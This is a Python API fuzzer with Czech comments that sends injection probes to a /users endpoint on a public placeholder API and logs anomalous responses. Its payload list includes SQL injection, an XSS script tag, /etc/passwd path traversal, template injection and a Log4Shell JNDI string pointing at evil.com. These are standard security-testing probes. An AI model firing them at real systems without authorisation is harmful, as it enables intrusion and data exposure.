#!/usr/bin/env python3
import requests
import json
import time
import random
from typing import List, Dict, Any

class APIFuzzer:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'API-Fuzzer/1.0'
        })
        self.results = []
    
    def fuzz_parameters(self, endpoint: str, params: List[str], payloads: List[str]):
        """Fuzzing URL parametrů"""
        print(f"  🔍 Fuzzing parametrů pro {endpoint}")
        
        for param in params:
            for payload in payloads:
                try:
                    response = self.session.get(
                        f"{self.base_url}{endpoint}",
                        params={param: payload}
                    )
                    
                    result = {
                        'type': 'parameter',
                        'endpoint': endpoint,
                        'parameter': param,
                        'payload': payload,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'response_time': response.elapsed.total_seconds()
                    }
                    
                    # Detekce anomálií
                    if (response.status_code not in [200, 404, 400] or 
                        response.elapsed.total_seconds() > 5 or
                        len(response.text) > 10000):
                        result['anomaly'] = True
                        print(f"    🚨 Anomálie: {param}={payload} -> {response.status_code}")
                    
                    self.results.append(result)
                    
                except Exception as e:
                    print(f"    ❌ Chyba: {param}={payload} -> {str(e)}")
                
                time.sleep(0.1)  # Rate limiting
    
    def fuzz_json_data(self, endpoint: str, fields: List[str], payloads: List[str]):
        """Fuzzing JSON dat"""
        print(f"  🔍 Fuzzing JSON dat pro {endpoint}")
        
        for field in fields:
            for payload in payloads:
                try:
                    data = {field: payload, "email": "test@example.com"}
                    
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json=data
                    )
                    
                    result = {
                        'type': 'json_data',
                        'endpoint': endpoint,
                        'field': field,
                        'payload': payload,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'response_time': response.elapsed.total_seconds()
                    }
                    
                    # Detekce anomálií
                    if (response.status_code == 500 or 
                        'error' in response.text.lower() or
                        payload in response.text):
                        result['anomaly'] = True
                        print(f"    🚨 Anomálie: {field}={payload} -> {response.status_code}")
                    
                    self.results.append(result)
                    
                except Exception as e:
                    print(f"    ❌ Chyba: {field}={payload} -> {str(e)}")
                
                time.sleep(0.1)
    
    def generate_random_payloads(self, count: int = 50) -> List[str]:
        """Generování náhodných payloadů"""
        payloads = []
        
        for _ in range(count):
            # Náhodné stringy
            length = random.randint(1, 1000)
            chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?'
            payload = ''.join(random.choice(chars) for _ in range(length))
            payloads.append(payload)
        
        return payloads
    
    def run_fuzzing(self):
        """Spuštění fuzzing testů"""
        print("🐍 Python API Fuzzer")
        
        # Základní payloady
        injection_payloads = [
            "' OR '1'='1",
            "<script>alert('XSS')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "A" * 1000,  # Buffer overflow test
            "\x00\x01\x02\x03",  # Binary data
            "🚀🔥💥",  # Unicode
        ]
        
        # Fuzzing parametrů
        self.fuzz_parameters(
            "/users",
            ["id", "name", "email", "search"],
            injection_payloads
        )
        
        # Fuzzing JSON dat
        self.fuzz_json_data(
            "/users",
            ["name", "username", "email"],
            injection_payloads
        )
        
        # Fuzzing s náhodnými daty
        random_payloads = self.generate_random_payloads(20)
        self.fuzz_parameters("/users", ["id"], random_payloads)
        
        # Uložení výsledků
        with open('python_fuzzing_results.json', 'w') as f:
            json.dump(self.results, f, indent=2)
        
        # Statistiky
        total_tests = len(self.results)
        anomalies = len([r for r in self.results if r.get('anomaly', False)])
        
        print(f"  📊 Celkem testů: {total_tests}")
        print(f"  🚨 Anomálií: {anomalies}")
        
        return self.results

if __name__ == "__main__":
    fuzzer = APIFuzzer("https://jsonplaceholder.typicode.com")
    fuzzer.run_fuzzing()
